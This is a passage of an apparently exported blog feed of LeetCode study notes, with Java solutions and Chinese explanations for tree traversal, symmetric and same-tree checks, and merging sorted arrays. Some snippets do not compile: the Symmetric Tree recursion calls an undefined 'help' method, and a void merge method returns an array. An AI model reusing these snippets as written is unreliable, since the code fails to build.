<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeLevelOrderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using DFS recursion !</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; reslist = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> reslist;</span><br><span class="line">        &#125;</span><br><span class="line">        levelOrderHelp(reslist,root,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> reslist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">levelOrderHelp</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; reslist, TreeNode node, <span class="keyword">int</span> level)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(reslist.size()&lt;level)&#123;</span><br><span class="line">            reslist.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">        &#125;</span><br><span class="line">        reslist.get(level-<span class="number">1</span>).add(node.val);</span><br><span class="line">        <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            levelOrderHelp(reslist,node.left,level+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            levelOrderHelp(reslist,node.right,level+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用DFS的思路，对于二叉树上的每一个节点，根据传进去的level参数，在数组中找到它的定位并添加。</p>
</blockquote>
<h2 id="Solution3"><a href="#Solution3" class="headerlink" title="Solution3"></a>Solution3</h2><p><strong>BFS思路</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeLevelOrderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using BFS</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; reslist = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> reslist;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">int</span> length = queue.size();</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">                TreeNode node = queue.poll();</span><br><span class="line">                list.add(node.val);</span><br><span class="line">                <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            reslist.add(list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reslist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>主要思路是利用Queus队列这一数据结构，来实现BFS遍历。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这个题很不错，总结了前面的二叉树的各种使用方法，最后灵活的解决了问题。注意使用递归和Queue和Stack这几种数据机构和方法，这些是解决二叉树问题的基本手段。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Queue(队列)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
        <tag>Optimize(优化)</tag>
      </tags>
  </entry>
  <entry>
    <title>101. Symmetric Tree</title>
    <url>/2017/05/04/101-Symmetric-Tree/</url>
    <content><![CDATA[<p>Given a binary tree, check whether it is a mirror of itself (ie, symmetric around its center).</p>
<p>For example, this binary tree <code>[1,2,2,3,4,4,3]</code> is symmetric:</p>
<pre><code>    1
   / \
  2   2
 / \ / \
3  4 4  3
</code></pre><p>But the following <code>[1,2,2,null,3,null,3]</code> is not:</p>
<pre><code>  1
 / \
2   2
 \   \
 3    3
</code></pre><a id="more"></a>
<p>同类题目：</p>
<h1 id="100-Same-Tree"><a href="#100-Same-Tree" class="headerlink" title="100. Same Tree"></a><a href="https://war3cdota.github.io/2017/05/04/100-Same-Tree/">100. Same Tree</a></h1><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><blockquote>
<p>这种树的问题一般两种思路：递归和非递归。<br></p>
</blockquote>
<h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>递归法</strong></p>
<p>使用递归来解决，注意树的比较，是左子树的右节点和右子树的左节点比较，这样才是对称的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SymmetricTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span> &amp;&amp; root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span> || root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isSymmetricHelp(root.left,root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetricHelp</span><span class="params">(TreeNode left,TreeNode right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left==<span class="keyword">null</span> &amp;&amp; right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(left==<span class="keyword">null</span> || right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(left.val!=right.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> help(left.left,right.right)&amp;&amp;help(left.right,right.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Boundary Check（边界检测）</strong></p>
<p>注意边界检测，都为空节点返回true。</p>
<h2 id="非递归法"><a href="#非递归法" class="headerlink" title="非递归法"></a>非递归法</h2><p>使用栈或者队列来解决，主要是借助栈或者队列来解决。</p>
<p><strong>BFS思路</strong></p>
<p>广度优先遍历主要借助队列这一数据结构。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SymmetricTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue_p = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        Queue&lt;TreeNode&gt; queue_q = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue_p.add(root);</span><br><span class="line">        queue_q.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue_p.isEmpty()&amp;&amp;!queue_q.isEmpty())&#123;</span><br><span class="line">            TreeNode pn = queue_p.poll();</span><br><span class="line">            TreeNode qn = queue_q.poll();</span><br><span class="line">            <span class="keyword">if</span>(pn.val!=qn.val)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_p.add(pn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_q.add(qn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(queue_p.size()!=queue_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_p.add(pn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_q.add(qn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(queue_p.size()!=queue_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> queue_p.size()==queue_q.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>DFS思路</strong></p>
<p>深度优先遍历主要借助栈这一数据结构。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SymmetricTree2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span> &amp;&amp; root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span> || root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack_left = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack_right = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            stack_left.push(root.left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            stack_right.push(root.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(stack_right.size()!=stack_left.size())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left.val!=root.right.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!stack_left.empty()&amp;&amp;!stack_right.empty())&#123;</span><br><span class="line">            TreeNode left = stack_left.pop();</span><br><span class="line">            TreeNode right = stack_right.pop();</span><br><span class="line">            <span class="keyword">if</span>(left.val!=right.val)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(left.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_left.push(left.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(right.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_right.push(right.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(stack_left.size()!=stack_right.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(left.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_left.push(left.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(right.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_right.push(right.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(stack_left.size()!=stack_right.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack_right.size()==stack_left.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>注意深度优先遍历和广度优先遍历，这里两处的代码基本可以说是一致的，但是由于使用的栈和队列的数据结构完全不相同，所以两种思路是完全不同的。不得不感慨数据结构的强大，虽然代码逻辑完全一样，但是由于使用了不同的数据结构，却出现了两种不同的解决思路。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Queue(队列)</tag>
        <tag>Stack(栈)</tag>
        <tag>Boundary Check(边界值检测)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
      </tags>
  </entry>
  <entry>
    <title>100. Same Tree</title>
    <url>/2017/05/04/100-Same-Tree/</url>
    <content><![CDATA[<p>Given two binary trees, write a function to check if they are equal or not.</p>
<p>Two binary trees are considered equal if they are structurally identical and the nodes have the same value.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><blockquote>
<p>二叉树的操作，感觉从方便性的角度考虑，使用递归是一个好方法。但是递归代码不易于理解。</p>
</blockquote>
<p><strong>Boundary Check</strong></p>
<ol>
<li>同时为空:true</li>
<li>左右子树不同:false。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SameTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="keyword">null</span>&amp;&amp;q==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p == <span class="keyword">null</span> || q == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p.val == q.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> isSameTree(p.left, q.left) &amp;&amp; isSameTree(p.right, q.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体的思路还是一个尾递归的思路，先判断尾部叶节点的元素，然后再向上递归。</p>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>使用BFS广度优先遍历</strong></p>
<blockquote>
<p>广度优先遍历借助了队列。<br>整体的思路是按层遍历，直到结束。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SameTree</span></span>&#123;</span><br><span class="line">    <span class="comment">//Using BFS</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="keyword">null</span>&amp;&amp;q==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue_p = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        Queue&lt;TreeNode&gt; queue_q = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue_p.add(p);</span><br><span class="line">        queue_q.add(q);</span><br><span class="line">        <span class="keyword">while</span>(!queue_p.isEmpty()&amp;&amp;!queue_q.isEmpty())&#123;</span><br><span class="line">            TreeNode pn = queue_p.poll();</span><br><span class="line">            TreeNode qn = queue_q.poll();</span><br><span class="line">            <span class="keyword">if</span>(pn.val!=qn.val)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_p.add(pn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_q.add(qn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(queue_p.size()!=queue_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_p.add(pn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_q.add(qn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(queue_p.size()!=queue_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> queue_p.size()==queue_q.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>使用DFS深度优先遍历</strong></p>
<blockquote>
<p>深度优先遍历借助了栈。<br>整体的思路由于栈的先进后出，后进先出的特点，所以，一定会先访问到某一个叶节点再返回。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SameTree</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using DFS</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="keyword">null</span> &amp;&amp; q==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="keyword">null</span> || q==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack_p = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack_q = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        stack_p.push(p);</span><br><span class="line">        stack_q.push(q);</span><br><span class="line">        <span class="keyword">while</span>(!stack_p.empty()&amp;&amp;!stack_q.empty())&#123;</span><br><span class="line">            TreeNode pn = stack_p.pop();</span><br><span class="line">            TreeNode qn = stack_q.pop();</span><br><span class="line">            <span class="keyword">if</span>(pn.val!=qn.val)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_p.push(pn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_q.push(qn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(stack_p.size()!=stack_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_p.push(pn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_q.push(qn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(stack_p.size()!=stack_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack_p.size()==stack_q.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两种遍历二叉树的方式很不相同，但是归根结底只是使用数据结构的不通，方法和思路是一致的。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>二叉树的递归操作思路是一种很巧妙的方法，需要我去熟悉理解。而使用堆栈及队列的遍历操作则是一种常规思路，注重数据结构的使用，需要去记忆。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Queue(队列)</tag>
        <tag>Stack(栈)</tag>
        <tag>Boundary Check(边界值检测)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
      </tags>
  </entry>
  <entry>
    <title>88. Merge Sorted Array</title>
    <url>/2017/04/27/88-Merge-Sorted-Array/</url>
    <content><![CDATA[<p>Given two sorted integer arrays <em>nums1</em> and <em>nums2</em>, merge <em>nums2</em> into <em>nums1</em> as one sorted array.</p>
<p><strong>Note:</strong></p>
<p>You may assume that nums1 has enough space (size that is greater or equal to m + n) to hold additional elements from nums2. The number of elements initialized in nums1 and nums2 are m and n respectively.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><blockquote>
<p>第一个想法，借助归并排序的思路。是一个中规中矩的做法。是可以通过的。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeSortedArray2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span> m, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> mergeArray[] = <span class="keyword">new</span> <span class="keyword">int</span>[m+n];</span><br><span class="line">        <span class="keyword">int</span> index1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> index2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;mergeArray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index1&gt;=m)&#123;</span><br><span class="line">                mergeArray[i] = nums2[index2++];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(index2&gt;=n)&#123;</span><br><span class="line">                mergeArray[i] = nums1[index1++];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums1[index1]&lt;nums2[index2])&#123;</span><br><span class="line">                    mergeArray[i] = nums1[index1++];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    mergeArray[i] = nums2[index2++];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;mergeArray.length;j++)&#123;</span><br><span class="line">            nums1[j] = mergeArray[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> mergeArray;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，借助另一个空间，空间复杂度O(n)</p>
<h2 id="Optimized"><a href="#Optimized" class="headerlink" title="Optimized"></a>Optimized</h2><p>其实这道题需求有点奇怪，m指前m个nums1元素，n指前n个nums2元素。<br>那之前为什么借助了一个数组作为临时数组，其实是为了解决最坏情况。<br>考虑一个情景：</p>
<blockquote>
<p>nums1 = [1,2,3,4] m=2;<br>nums2 = [5,6,7,8] n=2;</p>
</blockquote>
<p>按照要求，是[1,2]和[5,6]的排序，那如果不借助临时数组，在nums1中直接排序，则[5,6]会覆盖[1,2]的位置。</p>
<p><strong>但是换一个思路，如果用倒序的顺序排序呢？</strong></p>
<p>那就可以省去一个临时数组。</p>
<p>[1,2]和[5,6]可以排下，并且由于题设nums1的大小是一定大于m+n的。所以倒序是可行的，并且节省了空间复杂度。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeSortedArray</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span> m, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = m-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> j = n-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=m+n-<span class="number">1</span>;k&gt;=<span class="number">0</span>;k--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">0</span>&amp;&amp;j&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                nums1[k] = nums2[j--];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(j&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums1[i]&gt;nums2[j])&#123;</span><br><span class="line">                    nums1[k] = nums1[i--];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    nums1[k] = nums2[j--];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这题其实考的还是优化，由于之前学过归并排序，思路是有的，但是这个问题其实是可以不借助临时数组的。由于他的特殊性，倒序排序不会导致它的所需排序的元素被覆盖，这是应该注意的。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Optimize(优化)</tag>
      </tags>
  </entry>
  <entry>
    <title>83. Remove Duplicates from Sorted List</title>
    <url>/2017/04/27/83-Remove-Duplicates-from-Sorted-List/</url>
    <content><![CDATA[<p>Given a sorted linked list, delete all duplicates such that each element appear only once.</p>
<p>For example,<br><br>Given <code>1-&gt;1-&gt;2</code>, return <code>1-&gt;2</code>.<br><br>Given <code>1-&gt;1-&gt;2-&gt;3-&gt;3</code>, return <code>1-&gt;2-&gt;3</code>.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>伪码</strong></p>
<pre><code>while(head的下一个节点 != null){
    second &lt;-- head的下一个节点
    if(second的值 == head的值){
        third &lt;-- second的下一个节点
        if(third != null){
            second的值 &lt;-- third的值
            second的下一个节点 &lt;-- third的下一个节点
        }else{
